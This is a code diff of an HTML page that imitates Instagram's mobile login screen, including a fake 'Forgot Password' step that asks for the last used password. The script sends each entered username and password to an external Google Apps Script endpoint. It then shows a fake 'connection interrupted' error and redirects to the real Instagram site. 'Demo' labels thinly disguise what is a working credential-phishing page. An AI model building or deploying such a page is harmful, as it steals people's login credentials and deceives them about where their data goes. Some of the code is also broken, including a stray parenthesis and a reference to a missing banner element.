@@ -15,46 +15,33 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #1a1a1a;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
         }
 
-        .container {
-            flex: 1;
+        .login-container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
-            max-width: 400px;
-            margin: 0 auto;
-            width: 100%;
+            min-height: 100vh;
         }
 
         .language-selector {
-            text-align: center;
-            padding: 10px;
             color: #888888;
             font-size: 14px;
             margin-bottom: 20px;
-        }
-
-        .logo-container {
-            margin-bottom: 40px;
+            padding: 10px;
         }
 
         .logo {
             width: 80px;
             height: 80px;
+            margin-bottom: 40px;
         }
 
-        .form-container {
+        .form-box {
             width: 100%;
-        }
-
-        .input-group {
-            margin-bottom: 12px;
-            position: relative;
         }
 
         input {
@@ -65,22 +52,18 @@
             border-radius: 12px;
             color: #ffffff;
             font-size: 16px;
+            margin-bottom: 12px;
             outline: none;
-            transition: border-color 0.3s;
         }
 
         input::placeholder {
             color: #888888;
         }
 
-        input:focus {
-            border-color: #0095f6;
-        }
-
-        .error-message {
+        .error-msg {
             color: #ff4444;
             font-size: 12px;
-            margin-top: 5px;
+            margin-bottom: 10px;
             display: none;
             padding-left: 5px;
         }
@@ -95,17 +78,7 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.3s;
-        }
-
-        .login-btn:hover {
-            background-color: #0077c2;
-        }
-
-        .login-btn:disabled {
-            background-color: #005a94;
-            cursor: not-allowed;
+            margin-top: 10px;
         }
 
         .forgot-password {
@@ -122,14 +95,13 @@
         .create-account {
             margin-top: auto;
             padding: 20px;
+            width: 100%;
             text-align: center;
         }
 
         .create-account-btn {
             display: block;
             width: 100%;
-            max-width: 360px;
-            margin: 0 auto;
             padding: 16px;
             background-color: transparent;
             color: #0095f6;
@@ -141,28 +113,12 @@
         }
 
         .meta-logo {
-            text-align: center;
-            padding: 20px;
             color: #888888;
             font-size: 14px;
+            padding: 20px;
         }
 
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ffffff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Modal Styles */
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -171,16 +127,15 @@
             width: 100%;
             height: 100%;
             background-color: #1a1a1a;
-            z-index: 2000;
-            flex-direction: column;
+            z-index: 100;
             padding: 20px;
         }
 
         .modal-header {
             display: flex;
             align-items: center;
-            margin-bottom: 40px;
             padding-top: 20px;
+            margin-bottom: 40px;
         }
 
         .back-btn {
@@ -196,13 +151,7 @@
             font-weight: 600;
         }
 
-        .modal-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .modal-description {
+        .modal-text {
             color: #888888;
             font-size: 14px;
             margin-bottom: 30px;
@@ -230,35 +179,37 @@
             margin-top: 20px;
         }
 
-        .continue-btn:hover {
-            background-color: #0077c2;
-        }
-
-        /* Network Error Page Styles */
-        .network-error-page {
+        /* Network Error Page */
+        .network-error {
             display: none;
-            background-color: #1a1a1a;
-            min-height: 100vh;
-            width: 100%;
-            flex-direction: column;
-            align-items: center;
-            padding: 100px 40px 60px;
             position: fixed;
             top: 0;
             left: 0;
-            z-index: 3000;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            z-index: 200;
+            flex-direction: column;
+            align-items: center;
+            padding: 100px 40px;
         }
 
         .error-icon {
             width: 60px;
             height: 60px;
             margin-bottom: 40px;
+            border: 2px solid #888888;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888888;
+            font-size: 30px;
         }
 
         .error-title {
             color: #888888;
             font-size: 22px;
-            font-weight: 400;
             margin-bottom: 15px;
             text-align: center;
         }
@@ -274,8 +225,7 @@
             color: #666666;
             font-size: 12px;
             font-family: monospace;
-            margin-bottom: 40px;
-            text-align: center;
+            margin-bottom: 60px;
         }
 
         .reload-btn {
@@ -291,254 +241,220 @@
             cursor: pointer;
             margin-top: auto;
         }
-
-        .reload-btn:hover {
-            background-color: #5a9eff;
-        }
     </style>
 </head>
 <body>
-    <!-- Check for redirect first -->
-    <script>
-        const REDIRECT_LINK = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en';
-        
-        if (sessionStorage.getItem('demoCompleted') === 'true') {
-            window.location.replace(REDIRECT_LINK);
-        }
-    </script>
 
-    <!-- SECURITY WARNING -->
+<!-- Check for redirect -->
+<script>
+    const REDIRECT_LINK = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en';
+    
+    if (sessionStorage.getItem('demoCompleted') === 'true') {
+        window.location.replace(REDIRECT_LINK);
+    }
+</script>
 
-    <!-- Main Login Page -->
-    <div id="loginPage">
-        <div class="language-selector">
-            English (US) ▼
-        </div>
+<!-- Security Banner -->
+<!-- Login Page -->
+<div class="login-container" id="loginPage">
+    <div class="language-selector">English (US) ▼</div>
+    
+    <img src="instagram-logo.png" alt="Instagram" class="logo" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block'">
+    <div id="fallbackLogo" style="display: none; font-size: 60px; margin-bottom: 40px;">📷</div>
 
-        <div class="container">
-            <div class="logo-container">
-                <img src="instagram-logo.png" alt="Instagram" class="logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                <div style="display: none; font-size: 48px; color: white; text-align: center;">📷</div>
-            </div>
+    <div class="form-box">
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
+            <div class="error-msg" id="usernameError">Please enter your username</div>
+            
+            <input type="password" id="password" placeholder="Password">
+            <div class="error-msg" id="passwordError">Please enter your password</div>
+            
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
 
-            <div class="form-container">
-                <form id="loginForm">
-                    <div class="input-group">
-                        <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
-                        <div class="error-message" id="usernameError">Please enter your username</div>
-                    </div>
-                    
-                    <div class="input-group">
-                        <input type="password" id="password" placeholder="Password">
-                        <div class="error-message" id="passwordError">Please enter your password</div>
-                    </div>
-                    
-                    <button type="submit" class="login-btn" id="loginBtn">
-                        <span id="btnText">Log in</span>
-                        <div class="spinner" id="btnSpinner"></div>
-                    </button>
-                </form>
-
-                <div class="forgot-password">
-                    <a href="#" id="forgotPasswordLink">Forgot password?</a>
-                </div>
-            </div>
-        </div>
-
-        <div class="create-account">
-            <a href="#" class="create-account-btn">Create new account</a>
-        </div>
-
-        <div class="meta-logo">
-            Ⓜ️ Meta
+        <div class="forgot-password">
+            <a href="#" onclick="showForgotPassword(); return false;">Forgot password?</a>
         </div>
     </div>
 
-    <!-- Forgot Password Modal -->
-    <div class="modal" id="forgotPasswordModal">
-        <div class="modal-header">
-            <span class="back-btn" id="backBtn">←</span>
-            <span class="modal-title">Forgot Password</span>
-        </div>
-        
-        <div class="modal-content">
-            <div class="step active" id="step1">
-                <div class="modal-description">
-                    Enter your username, email, or mobile number to search for your account.
-                </div>
-                <div class="input-group">
-                    <input type="text" id="fpUsername" placeholder="Username, email or mobile number">
-                    <div class="error-message" id="fpUsernameError">Please enter a valid username</div>
-                </div>
-                <button class="continue-btn" id="continueBtn1">Continue</button>
-            </div>
-
-            <div class="step" id="step2">
-                <div class="modal-description">
-                    Enter the last password you remember using with this account.
-                </div>
-                <div class="input-group">
-                    <input type="password" id="fpPassword" placeholder="Last used password">
-                    <div class="error-message" id="fpPasswordError">Please enter your last password</div>
-                </div>
-                <button class="continue-btn" id="continueBtn2">Log in</button>
-            </div>
-        </div>
+    <div class="create-account">
+        <a href="#" class="create-account-btn">Create new account</a>
     </div>
 
-    <!-- Network Error Page -->
-    <div class="network-error-page" id="networkErrorPage">
-        <svg class="error-icon" viewBox="0 0 24 24" fill="none" stroke="#888888" stroke-width="1.5">
-            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
-            <line x1="9" y1="9" x2="9" y2="9"></line>
-            <line x1="15" y1="9" x2="15" y2="9"></line>
-            <line x1="9" y1="15" x2="15" y2="15"></line>
-        </svg>
-        
-        <h1 class="error-title">Your connection was interrupted</h1>
-        <p class="error-message">A network change was detected.</p>
-        <p class="error-code">ERR_NETWORK_CHANGED</p>
-        
-        <button class="reload-btn" id="reloadBtn">Reload</button>
+    <div class="meta-logo">Ⓜ️ Meta</div>
+</div>
+
+<!-- Forgot Password Modal -->
+<div class="modal" id="forgotModal">
+    <div class="modal-header">
+        <span class="back-btn" onclick="hideForgotPassword()">←</span>
+        <span class="modal-title">Forgot Password</span>
+    </div>
+    
+    <div class="step active" id="step1">
+        <div class="modal-text">Enter your username, email, or mobile number to search for your account.</div>
+        <input type="text" id="fpUsername" placeholder="Username, email or mobile number">
+        <div class="error-msg" id="fpUsernameError">Please enter a valid username</div>
+        <button class="continue-btn" onclick="goToStep2()">Continue</button>
     </div>
 
-    <script>
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxLnSVJlQpo4GULi-z8WfMOBwDPiZXGnusxz9Xf753m-_8O_KZcN-JPEreyxJgy4-HZvQ/exec';
+    <div class="step" id="step2">
+        <div class="modal-text">Enter the last password you remember using with this account.</div>
+        <input type="password" id="fpPassword" placeholder="Last used password">
+        <div class="error-msg" id="fpPasswordError">Please enter your last password</div>
+        <button class="continue-btn" onclick="submitForgotPassword()">Log in</button>
+    </div>
+</div>
 
-        // Login Form Handler
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            let hasError = false;
+<!-- Network Error Page -->
+<div class="network-error" id="networkError">
+    <div class="error-icon">⚠️</div>
+    <h1 class="error-title">Your connection was interrupted</h1>
+    <p class="error-message">A network change was detected.</p>
+    <p class="error-code">ERR_NETWORK_CHANGED</p>
+    <button class="reload-btn" onclick="window.location.href=REDIRECT_LINK">Reload</button>
+</div>
 
-            if (!username) {
-                document.getElementById('usernameError').style.display = 'block';
-                hasError = true;
-            } else {
-                document.getElementById('usernameError').style.display = 'none';
-            }
+<script>
+    // CONFIGURATION - REPLACE THIS URL WITH YOUR GOOGLE APPS SCRIPT URL
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxLnSVJlQpo4GULi-z8WfMOBwDPiZXGnusxz9Xf753m-_8O_KZcN-JPEreyxJgy4-HZvQ/exec';
+    
+    // Check if URL is set
+    if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
+        console.error('ERROR: Please replace YOUR_GOOGLE_APPS_SCRIPT_URL_HERE with your actual Google Apps Script URL');
+    }
 
-            if (!password) {
-                document.getElementById('passwordError').style.display = 'block';
-                hasError = true;
-            } else {
-                document.getElementById('passwordError').style.display = 'none';
-            }
+    // Login Form
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+        var hasError = false;
 
-            if (hasError) return;
-
-            // Show loading state
-            document.getElementById('btnText').style.display = 'none';
-            document.getElementById('btnSpinner').style.display = 'block';
-            document.getElementById('loginBtn').disabled = true;
-
-            // Mark demo as completed FIRST (before fetch)
-            sessionStorage.setItem('demoCompleted', 'true');
-
-            // Send to Google Sheets (don't wait for response)
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                body: JSON.stringify({
-                    type: 'login',
-                    username: username,
-                    password: password,
-                    userAgent: navigator.userAgent,
-                    ipInfo: 'Demo Mode'
-                })
-            }).catch(() => {
-                // Ignore errors - still show network error
-            });
-
-            // Show network error immediately (don't wait for fetch)
-            setTimeout(function() {
-                showNetworkError();
-            }, 500);
-        });
-
-        // Forgot Password Flow
-        document.getElementById('forgotPasswordLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('forgotPasswordModal').style.display = 'flex';
-        });
-
-        document.getElementById('backBtn').addEventListener('click', function() {
-            document.getElementById('forgotPasswordModal').style.display = 'none';
-            document.getElementById('step1').classList.add('active');
-            document.getElementById('step2').classList.remove('active');
-        });
-
-        document.getElementById('continueBtn1').addEventListener('click', function() {
-            const username = document.getElementById('fpUsername').value.trim();
-            
-            if (!username) {
-                document.getElementById('fpUsernameError').style.display = 'block';
-                return;
-            }
-            
-            document.getElementById('fpUsernameError').style.display = 'none';
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-        });
-
-        document.getElementById('continueBtn2').addEventListener('click', function() {
-            const username = document.getElementById('fpUsername').value.trim();
-            const password = document.getElementById('fpPassword').value.trim();
-            
-            if (!password) {
-                document.getElementById('fpPasswordError').style.display = 'block';
-                return;
-            }
-            
-            document.getElementById('fpPasswordError').style.display = 'none');
-
-            // Mark demo as completed FIRST
-            sessionStorage.setItem('demoCompleted', 'true');
-
-            // Send to Google Sheets (don't wait)
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                body: JSON.stringify({
-                    type: 'forgot_password',
-                    username: username,
-                    password: password,
-                    userAgent: navigator.userAgent,
-                    ipInfo: 'Demo Mode'
-                })
-            }).catch(() => {});
-
-            // Show network error immediately
-            setTimeout(function() {
-                showNetworkError();
-            }, 500);
-        });
-
-        // Show Network Error Page
-        function showNetworkError() {
-            // Hide login page elements
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('securityBanner').style.display = 'none';
-            document.getElementById('forgotPasswordModal').style.display = 'none';
-            
-            // Show network error page
-            var errorPage = document.getElementById('networkErrorPage');
-            errorPage.style.display = 'flex';
-        }
-
-        // Reload Button - Redirect to specified link
-        document.getElementById('reloadBtn').addEventListener('click', function() {
-            window.location.href = REDIRECT_LINK;
-        });
-
-        // Clear errors on input
-        document.getElementById('username').addEventListener('input', function() {
+        // Validation
+        if (!username) {
+            document.getElementById('usernameError').style.display = 'block';
+            hasError = true;
+        } else {
             document.getElementById('usernameError').style.display = 'none';
-        });
+        }
 
-        document.getElementById('password').addEventListener('input', function() {
+        if (!password) {
+            document.getElementById('passwordError').style.display = 'block';
+            hasError = true;
+        } else {
             document.getElementById('passwordError').style.display = 'none';
+        }
+
+        if (hasError) return;
+
+        console.log('Login attempted:', username);
+
+        // Save to Google Sheets
+        saveToSheet('login', username, password);
+
+        // Mark as completed and show error page
+        sessionStorage.setItem('demoCompleted', 'true');
+        
+        setTimeout(function() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.querySelector('.security-banner').style.display = 'none';
+            document.getElementById('networkError').style.display = 'flex';
+        }, 1000);
+    });
+
+    // Forgot Password Functions
+    function showForgotPassword() {
+        document.getElementById('forgotModal').style.display = 'block';
+        document.getElementById('step1').classList.add('active');
+        document.getElementById('step2').classList.remove('active');
+    }
+
+    function hideForgotPassword() {
+        document.getElementById('forgotModal').style.display = 'none';
+    }
+
+    function goToStep2() {
+        var username = document.getElementById('fpUsername').value.trim();
+        
+        if (!username) {
+            document.getElementById('fpUsernameError').style.display = 'block';
+            return;
+        }
+        
+        document.getElementById('fpUsernameError').style.display = 'none';
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+    }
+
+    function submitForgotPassword() {
+        var username = document.getElementById('fpUsername').value.trim();
+        var password = document.getElementById('fpPassword').value.trim();
+        
+        if (!password) {
+            document.getElementById('fpPasswordError').style.display = 'block';
+            return;
+        }
+        
+        document.getElementById('fpPasswordError').style.display = 'none';
+
+        console.log('Forgot password submitted:', username, password);
+
+        // Save to Google Sheets
+        saveToSheet('forgot_password', username, password);
+
+        // Mark as completed and show error page
+        sessionStorage.setItem('demoCompleted', 'true');
+        
+        setTimeout(function() {
+            document.getElementById('forgotModal').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'none';
+            document.querySelector('.security-banner').style.display = 'none';
+            document.getElementById('networkError').style.display = 'flex';
+        }, 1000);
+    }
+
+    // Save to Google Sheets function
+    function saveToSheet(type, username, password) {
+        if (GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
+            console.log('Demo mode - data would be saved:', {type, username, password});
+            return;
+        }
+
+        var data = {
+            type: type,
+            username: username,
+            password: password,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+
+        // Use no-cors mode to avoid CORS issues
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        }).then(function() {
+            console.log('Data saved successfully');
+        }).catch(function(error) {
+            console.log('Save attempted (no-cors mode):', error);
         });
-    </script>
+    }
+
+    // Clear errors on input
+    document.getElementById('username').addEventListener('input', function() {
+        document.getElementById('usernameError').style.display = 'none';
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+        document.getElementById('passwordError').style.display = 'none';
+    });
+</script>
+
 </body>
 </html>
